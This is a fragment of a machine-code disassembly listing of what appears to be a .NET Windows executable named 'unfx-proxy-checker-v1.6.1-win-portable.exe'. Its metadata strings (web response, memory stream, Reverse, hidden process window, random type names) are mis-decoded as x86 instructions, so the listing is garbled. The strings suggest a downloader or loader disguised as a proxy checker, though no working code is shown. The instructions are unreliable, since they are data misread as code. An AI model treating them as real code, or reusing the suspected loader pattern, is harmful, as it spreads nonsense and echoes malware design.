   140002b5d:	00 46 6f             	add    %al,0x6f(%rsi)
   140002b60:	72 6d                	jb     0x140002bcf
   140002b62:	32 00                	xor    (%rax),%al
   140002b64:	3c 4d                	cmp    $0x4d,%al
   140002b66:	6f                   	outsl  (%rsi),(%dx)
   140002b67:	64 75 6c             	fs jne 0x140002bd6
   140002b6a:	65 3e 00 53 79       	gs add %dl,%gs:0x79(%rbx)
   140002b6f:	73 74                	jae    0x140002be5
   140002b71:	65 6d                	gs insl (%dx),(%rdi)
   140002b73:	2e 49                	cs rex.WB
   140002b75:	4f 00 6d 73          	rex.WRXB add %r13b,0x73(%r13)
   140002b79:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   140002b7c:	6c                   	insb   (%dx),(%rdi)
   140002b7d:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%rdx),%esp
   140002b84:	65 6d                	gs insl (%dx),(%rdi)
   140002b86:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140002b89:	6c                   	insb   (%dx),(%rdi)
   140002b8a:	6c                   	insb   (%dx),(%rdi)
   140002b8b:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140002b90:	6e                   	outsb  (%rsi),(%dx)
   140002b91:	73 2e                	jae    0x140002bc1
   140002b93:	47                   	rex.RXB
   140002b94:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002b96:	65 72 69             	gs jb  0x140002c02
   140002b99:	63 00                	movsxd (%rax),%eax
   140002b9b:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140002b9d:	61                   	(bad)
   140002b9e:	64 00 67 65          	add    %ah,%fs:0x65(%rdi)
   140002ba2:	74 5f                	je     0x140002c03
   140002ba4:	48 61                	rex.W (bad)
   140002ba6:	73 45                	jae    0x140002bed
   140002ba8:	78 69                	js     0x140002c13
   140002baa:	74 65                	je     0x140002c11
   140002bac:	64 00 53 79          	add    %dl,%fs:0x79(%rbx)
   140002bb0:	6e                   	outsb  (%rsi),(%dx)
   140002bb1:	63 68 72             	movsxd 0x72(%rax),%ebp
   140002bb4:	6f                   	outsl  (%rsi),(%dx)
   140002bb5:	6e                   	outsb  (%rsi),(%dx)
   140002bb6:	69 7a 65 64 00 64 65 	imul   $0x65640064,0x65(%rdx),%edi
   140002bbd:	66 61                	data16 (bad)
   140002bbf:	75 6c                	jne    0x140002c2d
   140002bc1:	74 49                	je     0x140002c0c
   140002bc3:	6e                   	outsb  (%rsi),(%dx)
   140002bc4:	73 74                	jae    0x140002c3a
   140002bc6:	61                   	(bad)
   140002bc7:	6e                   	outsb  (%rsi),(%dx)
   140002bc8:	63 65 00             	movsxd 0x0(%rbp),%esp
   140002bcb:	73 65                	jae    0x140002c32
   140002bcd:	74 5f                	je     0x140002c2e
   140002bcf:	41 75 74             	rex.B jne 0x140002c46
   140002bd2:	6f                   	outsl  (%rsi),(%dx)
   140002bd3:	53                   	push   %rbx
   140002bd4:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   140002bd7:	65 4d 6f             	rex.WRB outsl %gs:(%rsi),(%dx)
   140002bda:	64 65 00 45 6e       	fs add %al,%gs:0x6e(%rbp)
   140002bdf:	75 6d                	jne    0x140002c4e
   140002be1:	65 72 61             	gs jb  0x140002c45
   140002be4:	62 6c 65 00 49       	(bad)
   140002be9:	44 69 73 70 6f 73 61 	imul   $0x6261736f,0x70(%rbx),%r14d
   140002bf0:	62 
   140002bf1:	6c                   	insb   (%dx),(%rdi)
   140002bf2:	65 00 75 6e          	add    %dh,%gs:0x6e(%rbp)
   140002bf6:	66 78 2d             	data16 js 0x140002c26
   140002bf9:	70 72                	jo     0x140002c6d
   140002bfb:	6f                   	outsl  (%rsi),(%dx)
   140002bfc:	78 79                	js     0x140002c77
   140002bfe:	2d 63 68 65 63       	sub    $0x63656863,%eax
   140002c03:	6b 65 72 2d          	imul   $0x2d,0x72(%rbp),%esp
   140002c07:	76 31                	jbe    0x140002c3a
   140002c09:	2e 36 2e 31 2d 77 69 	cs ss cs xor %ebp,0x2d6e6977(%rip)        # 0x16d6e9589
   140002c10:	6e 2d 
   140002c12:	70 6f                	jo     0x140002c83
   140002c14:	72 74                	jb     0x140002c8a
   140002c16:	61                   	(bad)
   140002c17:	62 6c 65 00 52       	(bad)
   140002c1c:	75 6e                	jne    0x140002c8c
   140002c1e:	74 69                	je     0x140002c89
   140002c20:	6d                   	insl   (%dx),(%rdi)
   140002c21:	65 54                	gs push %rsp
   140002c23:	79 70                	jns    0x140002c95
   140002c25:	65 48 61             	gs rex.W (bad)
   140002c28:	6e                   	outsb  (%rsi),(%dx)
   140002c29:	64 6c                	fs insb (%dx),(%rdi)
   140002c2b:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
   140002c2f:	74 54                	je     0x140002c85
   140002c31:	79 70                	jns    0x140002ca3
   140002c33:	65 46 72 6f          	gs rex.RX jb 0x140002ca6
   140002c37:	6d                   	insl   (%dx),(%rdi)
   140002c38:	48 61                	rex.W (bad)
   140002c3a:	6e                   	outsb  (%rsi),(%dx)
   140002c3b:	64 6c                	fs insb (%dx),(%rdi)
   140002c3d:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002c41:	74 5f                	je     0x140002ca2
   140002c43:	57                   	push   %rdi
   140002c44:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
   140002c4b:	79 6c                	jns    0x140002cb9
   140002c4d:	65 00 50 72          	add    %dl,%gs:0x72(%rax)
   140002c51:	6f                   	outsl  (%rsi),(%dx)
   140002c52:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002c55:	73 57                	jae    0x140002cae
   140002c57:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
   140002c5e:	79 6c                	jns    0x140002ccc
   140002c60:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   140002c64:	74 5f                	je     0x140002cc5
   140002c66:	4e 61                	rex.WRX (bad)
   140002c68:	6d                   	insl   (%dx),(%rdi)
   140002c69:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002c6d:	74 5f                	je     0x140002cce
   140002c6f:	4e 61                	rex.WRX (bad)
   140002c71:	6d                   	insl   (%dx),(%rdi)
   140002c72:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002c76:	74 5f                	je     0x140002cd7
   140002c78:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140002c7f:	65 00 
   140002c81:	67 65 74 5f          	addr32 gs je 0x140002ce4
   140002c85:	46 75 6c             	rex.RX jne 0x140002cf4
   140002c88:	6c                   	insb   (%dx),(%rdi)
   140002c89:	4e 61                	rex.WRX (bad)
   140002c8b:	6d                   	insl   (%dx),(%rdi)
   140002c8c:	65 00 53 65          	add    %dl,%gs:0x65(%rbx)
   140002c90:	63 75 72             	movsxd 0x72(%rbp),%esi
   140002c93:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%rcx,%rdi,2),%esi
   140002c9a:	6f 
   140002c9b:	63 6f 6c             	movsxd 0x6c(%rdi),%ebp
   140002c9e:	54                   	push   %rsp
   140002c9f:	79 70                	jns    0x140002d11
   140002ca1:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   140002ca5:	73 74                	jae    0x140002d1b
   140002ca7:	65 6d                	gs insl (%dx),(%rdi)
   140002ca9:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140002cac:	72 65                	jb     0x140002d13
   140002cae:	00 67 65             	add    %ah,0x65(%rdi)
   140002cb1:	74 5f                	je     0x140002d12
   140002cb3:	43 75 6c             	rex.XB jne 0x140002d22
   140002cb6:	74 75                	je     0x140002d2d
   140002cb8:	72 65                	jb     0x140002d1f
   140002cba:	00 73 65             	add    %dh,0x65(%rbx)
   140002cbd:	74 5f                	je     0x140002d1e
   140002cbf:	43 75 6c             	rex.XB jne 0x140002d2e
   140002cc2:	74 75                	je     0x140002d39
   140002cc4:	72 65                	jb     0x140002d2b
   140002cc6:	00 72 65             	add    %dh,0x65(%rdx)
   140002cc9:	73 6f                	jae    0x140002d3a
   140002ccb:	75 72                	jne    0x140002d3f
   140002ccd:	63 65 43             	movsxd 0x43(%rbp),%esp
   140002cd0:	75 6c                	jne    0x140002d3e
   140002cd2:	74 75                	je     0x140002d49
   140002cd4:	72 65                	jb     0x140002d3b
   140002cd6:	00 41 70             	add    %al,0x70(%rcx)
   140002cd9:	70 6c                	jo     0x140002d47
   140002cdb:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%rbx),%esp
   140002ce2:	53                   	push   %rbx
   140002ce3:	65 74 74             	gs je  0x140002d5a
   140002ce6:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%rsi),%ebp
   140002ced:	65 00 48 74          	add    %cl,%gs:0x74(%rax)
   140002cf1:	74 70                	je     0x140002d63
   140002cf3:	57                   	push   %rdi
   140002cf4:	65 62 52 65 73 70    	(bad)
   140002cfa:	6f                   	outsl  (%rsi),(%dx)
   140002cfb:	6e                   	outsb  (%rsi),(%dx)
   140002cfc:	73 65                	jae    0x140002d63
   140002cfe:	00 47 65             	add    %al,0x65(%rdi)
   140002d01:	74 52                	je     0x140002d55
   140002d03:	65 73 70             	gs jae 0x140002d76
   140002d06:	6f                   	outsl  (%rsi),(%dx)
   140002d07:	6e                   	outsb  (%rsi),(%dx)
   140002d08:	73 65                	jae    0x140002d6f
   140002d0a:	00 44 69 73          	add    %al,0x73(%rcx,%rbp,2)
   140002d0e:	70 6f                	jo     0x140002d7f
   140002d10:	73 65                	jae    0x140002d77
   140002d12:	00 52 65             	add    %dl,0x65(%rdx)
   140002d15:	76 65                	jbe    0x140002d7c
   140002d17:	72 73                	jb     0x140002d8c
   140002d19:	65 00 43 72          	add    %al,%gs:0x72(%rbx)
   140002d1d:	65 61                	gs (bad)
   140002d1f:	74 65                	je     0x140002d86
   140002d21:	00 45 64             	add    %al,0x64(%rbp)
   140002d24:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%rdi,%rbp,2),%esi
   140002d2b:	77 
   140002d2c:	73 61                	jae    0x140002d8f
   140002d2e:	62 6c 65 53 74       	(bad)
   140002d33:	61                   	(bad)
   140002d34:	74 65                	je     0x140002d9b
   140002d36:	00 73 69             	add    %dh,0x69(%rbx)
   140002d39:	74 65                	je     0x140002da0
   140002d3b:	00 53 54             	add    %dl,0x54(%rbx)
   140002d3e:	41 54                	push   %r12
   140002d40:	68 72 65 61 64       	push   $0x64616572
   140002d45:	41 74 74             	rex.B je 0x140002dbc
   140002d48:	72 69                	jb     0x140002db3
   140002d4a:	62 75 74 65 00       	(bad)
   140002d4f:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140002d51:	6d                   	insl   (%dx),(%rdi)
   140002d52:	70 69                	jo     0x140002dbd
   140002d54:	6c                   	insb   (%dx),(%rdi)
   140002d55:	65 72 47             	gs jb  0x140002d9f
   140002d58:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002d5a:	65 72 61             	gs jb  0x140002dbe
   140002d5d:	74 65                	je     0x140002dc4
   140002d5f:	64 41 74 74          	fs rex.B je 0x140002dd7
   140002d63:	72 69                	jb     0x140002dce
   140002d65:	62 75 74 65 00       	(bad)
   140002d6a:	47 75 69             	rex.RXB jne 0x140002dd6
   140002d6d:	64 41 74 74          	fs rex.B je 0x140002de5
   140002d71:	72 69                	jb     0x140002ddc
   140002d73:	62 75 74 65 00       	(bad)
   140002d78:	47                   	rex.RXB
   140002d79:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002d7b:	65 72 61             	gs jb  0x140002ddf
   140002d7e:	74 65                	je     0x140002de5
   140002d80:	64 43 6f             	rex.XB outsl %fs:(%rsi),(%dx)
   140002d83:	64 65 41 74 74       	fs gs rex.B je 0x140002dfc
   140002d88:	72 69                	jb     0x140002df3
   140002d8a:	62 75 74 65 00       	(bad)
   140002d8f:	44                   	rex.R
   140002d90:	65 62 75 67 67 65    	(bad)
   140002d96:	72 4e                	jb     0x140002de6
   140002d98:	6f                   	outsl  (%rsi),(%dx)
   140002d99:	6e                   	outsb  (%rsi),(%dx)
   140002d9a:	55                   	push   %rbp
   140002d9b:	73 65                	jae    0x140002e02
   140002d9d:	72 43                	jb     0x140002de2
   140002d9f:	6f                   	outsl  (%rsi),(%dx)
   140002da0:	64 65 41 74 74       	fs gs rex.B je 0x140002e19
   140002da5:	72 69                	jb     0x140002e10
   140002da7:	62 75 74 65 00       	(bad)
   140002dac:	44                   	rex.R
   140002dad:	65 62 75 67 67 61    	(bad)
   140002db3:	62 6c 65 41 74       	(bad)
   140002db8:	74 72                	je     0x140002e2c
   140002dba:	69 62 75 74 65 00 45 	imul   $0x45006574,0x75(%rdx),%esp
   140002dc1:	64 69 74 6f 72 42 72 	imul   $0x776f7242,%fs:0x72(%rdi,%rbp,2),%esi
   140002dc8:	6f 77 
   140002dca:	73 61                	jae    0x140002e2d
   140002dcc:	62 6c 65 41 74       	(bad)
   140002dd1:	74 72                	je     0x140002e45
   140002dd3:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140002dda:	6f                   	outsl  (%rsi),(%dx)
   140002ddb:	6d                   	insl   (%dx),(%rdi)
   140002ddc:	56                   	push   %rsi
   140002ddd:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%rbx),%esi
   140002de4:	74 74                	je     0x140002e5a
   140002de6:	72 69                	jb     0x140002e51
   140002de8:	62 75 74 65 00       	(bad)
   140002ded:	41 73 73             	rex.B jae 0x140002e63
   140002df0:	65 6d                	gs insl (%dx),(%rdi)
   140002df2:	62 6c 79 54 69       	(bad)
   140002df7:	74 6c                	je     0x140002e65
   140002df9:	65 41 74 74          	gs rex.B je 0x140002e71
   140002dfd:	72 69                	jb     0x140002e68
   140002dff:	62 75 74 65 00       	(bad)
   140002e04:	41 73 73             	rex.B jae 0x140002e7a
   140002e07:	65 6d                	gs insl (%dx),(%rdi)
   140002e09:	62 6c 79 54 72       	(bad)
   140002e0e:	61                   	(bad)
   140002e0f:	64 65 6d             	fs gs insl (%dx),(%rdi)
   140002e12:	61                   	(bad)
   140002e13:	72 6b                	jb     0x140002e80
   140002e15:	41 74 74             	rex.B je 0x140002e8c
   140002e18:	72 69                	jb     0x140002e83
   140002e1a:	62 75 74 65 00       	(bad)
   140002e1f:	54                   	push   %rsp
   140002e20:	61                   	(bad)
   140002e21:	72 67                	jb     0x140002e8a
   140002e23:	65 74 46             	gs je  0x140002e6c
   140002e26:	72 61                	jb     0x140002e89
   140002e28:	6d                   	insl   (%dx),(%rdi)
   140002e29:	65 77 6f             	gs ja  0x140002e9b
   140002e2c:	72 6b                	jb     0x140002e99
   140002e2e:	41 74 74             	rex.B je 0x140002ea5
   140002e31:	72 69                	jb     0x140002e9c
   140002e33:	62 75 74 65 00       	(bad)
   140002e38:	41 73 73             	rex.B jae 0x140002eae
   140002e3b:	65 6d                	gs insl (%dx),(%rdi)
   140002e3d:	62 6c 79 46 69       	(bad)
   140002e42:	6c                   	insb   (%dx),(%rdi)
   140002e43:	65 56                	gs push %rsi
   140002e45:	65 72 73             	gs jb  0x140002ebb
   140002e48:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140002e4f:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   140002e56:	73 73                	jae    0x140002ecb
   140002e58:	65 6d                	gs insl (%dx),(%rdi)
   140002e5a:	62 6c 79 43 6f       	(bad)
   140002e5f:	6e                   	outsb  (%rsi),(%dx)
   140002e60:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140002e66:	74 69                	je     0x140002ed1
   140002e68:	6f                   	outsl  (%rsi),(%dx)
   140002e69:	6e                   	outsb  (%rsi),(%dx)
   140002e6a:	41 74 74             	rex.B je 0x140002ee1
   140002e6d:	72 69                	jb     0x140002ed8
   140002e6f:	62 75 74 65 00       	(bad)
   140002e74:	41 73 73             	rex.B jae 0x140002eea
   140002e77:	65 6d                	gs insl (%dx),(%rdi)
   140002e79:	62 6c 79 44 65       	(bad)
   140002e7e:	73 63                	jae    0x140002ee3
   140002e80:	72 69                	jb     0x140002eeb
   140002e82:	70 74                	jo     0x140002ef8
   140002e84:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140002e8b:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140002e92:	6f                   	outsl  (%rsi),(%dx)
   140002e93:	6d                   	insl   (%dx),(%rdi)
   140002e94:	70 69                	jo     0x140002eff
   140002e96:	6c                   	insb   (%dx),(%rdi)
   140002e97:	61                   	(bad)
   140002e98:	74 69                	je     0x140002f03
   140002e9a:	6f                   	outsl  (%rsi),(%dx)
   140002e9b:	6e                   	outsb  (%rsi),(%dx)
   140002e9c:	52                   	push   %rdx
   140002e9d:	65 6c                	gs insb (%dx),(%rdi)
   140002e9f:	61                   	(bad)
   140002ea0:	78 61                	js     0x140002f03
   140002ea2:	74 69                	je     0x140002f0d
   140002ea4:	6f                   	outsl  (%rsi),(%dx)
   140002ea5:	6e                   	outsb  (%rsi),(%dx)
   140002ea6:	73 41                	jae    0x140002ee9
   140002ea8:	74 74                	je     0x140002f1e
   140002eaa:	72 69                	jb     0x140002f15
   140002eac:	62 75 74 65 00       	(bad)
   140002eb1:	41 73 73             	rex.B jae 0x140002f27
   140002eb4:	65 6d                	gs insl (%dx),(%rdi)
   140002eb6:	62 6c 79 50 72       	(bad)
   140002ebb:	6f                   	outsl  (%rsi),(%dx)
   140002ebc:	64 75 63             	fs jne 0x140002f22
   140002ebf:	74 41                	je     0x140002f02
   140002ec1:	74 74                	je     0x140002f37
   140002ec3:	72 69                	jb     0x140002f2e
   140002ec5:	62 75 74 65 00       	(bad)
   140002eca:	41 73 73             	rex.B jae 0x140002f40
   140002ecd:	65 6d                	gs insl (%dx),(%rdi)
   140002ecf:	62 6c 79 43 6f       	(bad)
   140002ed4:	70 79                	jo     0x140002f4f
   140002ed6:	72 69                	jb     0x140002f41
   140002ed8:	67 68 74 41 74 74    	addr32 push $0x74744174
   140002ede:	72 69                	jb     0x140002f49
   140002ee0:	62 75 74 65 00       	(bad)
   140002ee5:	41 73 73             	rex.B jae 0x140002f5b
   140002ee8:	65 6d                	gs insl (%dx),(%rdi)
   140002eea:	62 6c 79 43 6f       	(bad)
   140002eef:	6d                   	insl   (%dx),(%rdi)
   140002ef0:	70 61                	jo     0x140002f53
   140002ef2:	6e                   	outsb  (%rsi),(%dx)
   140002ef3:	79 41                	jns    0x140002f36
   140002ef5:	74 74                	je     0x140002f6b
   140002ef7:	72 69                	jb     0x140002f62
   140002ef9:	62 75 74 65 00       	(bad)
   140002efe:	52                   	push   %rdx
   140002eff:	75 6e                	jne    0x140002f6f
   140002f01:	74 69                	je     0x140002f6c
   140002f03:	6d                   	insl   (%dx),(%rdi)
   140002f04:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140002f07:	6d                   	insl   (%dx),(%rdi)
   140002f08:	70 61                	jo     0x140002f6b
   140002f0a:	74 69                	je     0x140002f75
   140002f0c:	62 69 6c 69 74       	(bad)
   140002f11:	79 41                	jns    0x140002f54
   140002f13:	74 74                	je     0x140002f89
   140002f15:	72 69                	jb     0x140002f80
   140002f17:	62 75 74 65 00       	(bad)
   140002f1c:	76 61                	jbe    0x140002f7f
   140002f1e:	6c                   	insb   (%dx),(%rdi)
   140002f1f:	75 65                	jne    0x140002f86
   140002f21:	00 75 6e             	add    %dh,0x6e(%rbp)
   140002f24:	66 78 2d             	data16 js 0x140002f54
   140002f27:	70 72                	jo     0x140002f9b
   140002f29:	6f                   	outsl  (%rsi),(%dx)
   140002f2a:	78 79                	js     0x140002fa5
   140002f2c:	2d 63 68 65 63       	sub    $0x63656863,%eax
   140002f31:	6b 65 72 2d          	imul   $0x2d,0x72(%rbp),%esp
   140002f35:	76 31                	jbe    0x140002f68
   140002f37:	2e 36 2e 31 2d 77 69 	cs ss cs xor %ebp,0x2d6e6977(%rip)        # 0x16d6e98b7
   140002f3e:	6e 2d 
   140002f40:	70 6f                	jo     0x140002fb1
   140002f42:	72 74                	jb     0x140002fb8
   140002f44:	61                   	(bad)
   140002f45:	62 6c 65 2e 65       	(bad)
   140002f4a:	78 65                	js     0x140002fb1
   140002f4c:	00 73 65             	add    %dh,0x65(%rbx)
   140002f4f:	74 5f                	je     0x140002fb0
   140002f51:	43 6c                	rex.XB insb (%dx),(%rdi)
   140002f53:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%rbp),%esp
   140002f5a:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   140002f5e:	73 74                	jae    0x140002fd4
   140002f60:	65 6d                	gs insl (%dx),(%rdi)
   140002f62:	2e 52                	cs push %rdx
   140002f64:	75 6e                	jne    0x140002fd4
   140002f66:	74 69                	je     0x140002fd1
   140002f68:	6d                   	insl   (%dx),(%rdi)
   140002f69:	65 2e 56             	gs cs push %rsi
   140002f6c:	65 72 73             	gs jb  0x140002fe2
   140002f6f:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%rdi),%ebp
   140002f76:	53                   	push   %rbx
   140002f77:	74 72                	je     0x140002feb
   140002f79:	69 6e 67 00 64 69 73 	imul   $0x73696400,0x67(%rsi),%ebp
   140002f80:	70 6f                	jo     0x140002ff1
   140002f82:	73 69                	jae    0x140002fed
   140002f84:	6e                   	outsb  (%rsi),(%dx)
   140002f85:	67 00 53 79          	add    %dl,0x79(%ebx)
   140002f89:	73 74                	jae    0x140002fff
   140002f8b:	65 6d                	gs insl (%dx),(%rdi)
   140002f8d:	2e 44 72 61          	rex.R jb,pn 0x140002ff2
   140002f91:	77 69                	ja     0x140002ffc
   140002f93:	6e                   	outsb  (%rsi),(%dx)
   140002f94:	67 00 4b 71          	add    %cl,0x71(%ebx)
   140002f98:	68 74 73 65 63       	push   $0x63657374
   140002f9d:	6a 63                	push   $0x63
   140002f9f:	79 7a                	jns    0x14000301b
   140002fa1:	71 70                	jno    0x140003013
   140002fa3:	73 68                	jae    0x14000300d
   140002fa5:	62 67 77 6f 6d       	(bad)
   140002faa:	69 00 53 79 73 74    	imul   $0x74737953,(%rax),%eax
   140002fb0:	65 6d                	gs insl (%dx),(%rdi)
   140002fb2:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140002fb5:	6d                   	insl   (%dx),(%rdi)
   140002fb6:	70 6f                	jo     0x140003027
   140002fb8:	6e                   	outsb  (%rsi),(%dx)
   140002fb9:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002fbb:	74 4d                	je     0x14000300a
   140002fbd:	6f                   	outsl  (%rsi),(%dx)
   140002fbe:	64 65 6c             	fs gs insb (%dx),(%rdi)
   140002fc1:	00 73 65             	add    %dh,0x65(%rbx)
   140002fc4:	74 5f                	je     0x140003025
   140002fc6:	53                   	push   %rbx
   140002fc7:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140002fcb:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%rcx,%rdi,2),%esi
   140002fd2:	6f 
   140002fd3:	63 6f 6c             	movsxd 0x6c(%rdi),%ebp
   140002fd6:	00 43 6f             	add    %al,0x6f(%rbx)
   140002fd9:	6e                   	outsb  (%rsi),(%dx)
   140002fda:	74 61                	je     0x14000303d
   140002fdc:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%rsi),%ebp
   140002fe3:	74 72                	je     0x140003057
   140002fe5:	6f                   	outsl  (%rsi),(%dx)
   140002fe6:	6c                   	insb   (%dx),(%rdi)
   140002fe7:	00 75 72             	add    %dh,0x72(%rbp)
   140002fea:	6c                   	insb   (%dx),(%rdi)
   140002feb:	00 47 65             	add    %al,0x65(%rdi)
   140002fee:	74 52                	je     0x140003042
   140002ff0:	65 73 70             	gs jae 0x140003063
   140002ff3:	6f                   	outsl  (%rsi),(%dx)
   140002ff4:	6e                   	outsb  (%rsi),(%dx)
   140002ff5:	73 65                	jae    0x14000305c
   140002ff7:	53                   	push   %rbx
   140002ff8:	74 72                	je     0x14000306c
   140002ffa:	65 61                	gs (bad)
   140002ffc:	6d                   	insl   (%dx),(%rdi)
   140002ffd:	00 4d 65             	add    %cl,0x65(%rbp)
   140003000:	6d                   	insl   (%dx),(%rdi)
   140003001:	6f                   	outsl  (%rsi),(%dx)
   140003002:	72 79                	jb     0x14000307d
   140003004:	53                   	push   %rbx
   140003005:	74 72                	je     0x140003079
   140003007:	65 61                	gs (bad)
   140003009:	6d                   	insl   (%dx),(%rdi)
   14000300a:	00 50 72             	add    %dl,0x72(%rax)
   14000300d:	6f                   	outsl  (%rsi),(%dx)
   14000300e:	67 72 61             	addr32 jb 0x140003072
   140003011:	6d                   	insl   (%dx),(%rdi)
   140003012:	00 53 79             	add    %dl,0x79(%rbx)
   140003015:	73 74                	jae    0x14000308b
   140003017:	65 6d                	gs insl (%dx),(%rdi)
   140003019:	00 46 6f             	add    %al,0x6f(%rsi)
   14000301c:	72 6d                	jb     0x14000308b
   14000301e:	00 72 65             	add    %dh,0x65(%rdx)
   140003021:	73 6f                	jae    0x140003092
   140003023:	75 72                	jne    0x140003097
   140003025:	63 65 4d             	movsxd 0x4d(%rbp),%esp
   140003028:	61                   	(bad)
   140003029:	6e                   	outsb  (%rsi),(%dx)
   14000302a:	00 50 73             	add    %dl,0x73(%rax)
   14000302d:	75 6b                	jne    0x14000309a
   14000302f:	70 67                	jo     0x140003098
   140003031:	6e                   	outsb  (%rsi),(%dx)
   140003032:	00 4d 61             	add    %cl,0x61(%rbp)
   140003035:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%rsi),%ebp
   14000303c:	65 6d                	gs insl (%dx),(%rdi)
   14000303e:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003041:	6e                   	outsb  (%rsi),(%dx)
   140003042:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140003048:	74 69                	je     0x1400030b3
   14000304a:	6f                   	outsl  (%rsi),(%dx)
   14000304b:	6e                   	outsb  (%rsi),(%dx)
   14000304c:	00 53 79             	add    %dl,0x79(%rbx)
   14000304f:	73 74                	jae    0x1400030c5
   140003051:	65 6d                	gs insl (%dx),(%rdi)
   140003053:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
   140003056:	6f                   	outsl  (%rsi),(%dx)
   140003057:	62 61 6c 69 7a       	(bad)
   14000305c:	61                   	(bad)
   14000305d:	74 69                	je     0x1400030c8
   14000305f:	6f                   	outsl  (%rsi),(%dx)
   140003060:	6e                   	outsb  (%rsi),(%dx)
   140003061:	00 53 79             	add    %dl,0x79(%rbx)
   140003064:	73 74                	jae    0x1400030da
   140003066:	65 6d                	gs insl (%dx),(%rdi)
   140003068:	2e 52                	cs push %rdx
   14000306a:	65 66 6c             	gs data16 insb (%dx),(%rdi)
   14000306d:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003072:	6e                   	outsb  (%rsi),(%dx)
   140003073:	00 45 78             	add    %al,0x78(%rbp)
   140003076:	63 65 70             	movsxd 0x70(%rbp),%esp
   140003079:	74 69                	je     0x1400030e4
   14000307b:	6f                   	outsl  (%rsi),(%dx)
   14000307c:	6e                   	outsb  (%rsi),(%dx)
   14000307d:	00 42 75             	add    %al,0x75(%rdx)
   140003080:	74 74                	je     0x1400030f6
   140003082:	6f                   	outsl  (%rsi),(%dx)
   140003083:	6e                   	outsb  (%rsi),(%dx)
   140003084:	00 43 6f             	add    %al,0x6f(%rbx)
   140003087:	70 79                	jo     0x140003102
   140003089:	54                   	push   %rsp
   14000308a:	6f                   	outsl  (%rsi),(%dx)
   14000308b:	00 4d 65             	add    %cl,0x65(%rbp)
   14000308e:	74 68                	je     0x1400030f8
   140003090:	6f                   	outsl  (%rsi),(%dx)
   140003091:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
   140003094:	66 6f                	outsw  (%rsi),(%dx)
   140003096:	00 43 75             	add    %al,0x75(%rbx)
   140003099:	6c                   	insb   (%dx),(%rdi)
   14000309a:	74 75                	je     0x140003111
   14000309c:	72 65                	jb     0x140003103
   14000309e:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400030a0:	66 6f                	outsw  (%rsi),(%dx)
   1400030a2:	00 4d 65             	add    %cl,0x65(%rbp)
   1400030a5:	6d                   	insl   (%dx),(%rdi)
   1400030a6:	62 65 72 49 6e       	(bad)
   1400030ab:	66 6f                	outsw  (%rsi),(%dx)
   1400030ad:	00 67 65             	add    %ah,0x65(%rdi)
   1400030b0:	74 5f                	je     0x140003111
   1400030b2:	53                   	push   %rbx
   1400030b3:	74 61                	je     0x140003116
   1400030b5:	72 74                	jb     0x14000312b
   1400030b7:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400030b9:	66 6f                	outsw  (%rsi),(%dx)
   1400030bb:	00 50 72             	add    %dl,0x72(%rax)
   1400030be:	6f                   	outsl  (%rsi),(%dx)
   1400030bf:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400030c2:	73 53                	jae    0x140003117
   1400030c4:	74 61                	je     0x140003127
   1400030c6:	72 74                	jb     0x14000313c
   1400030c8:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400030ca:	66 6f                	outsw  (%rsi),(%dx)
   1400030cc:	00 53 79             	add    %dl,0x79(%rbx)
   1400030cf:	73 74                	jae    0x140003145
   1400030d1:	65 6d                	gs insl (%dx),(%rdi)
   1400030d3:	2e 4c 69 6e 71 00 49 	cs imul $0x766e4900,0x71(%rsi),%r13
   1400030da:	6e 76 
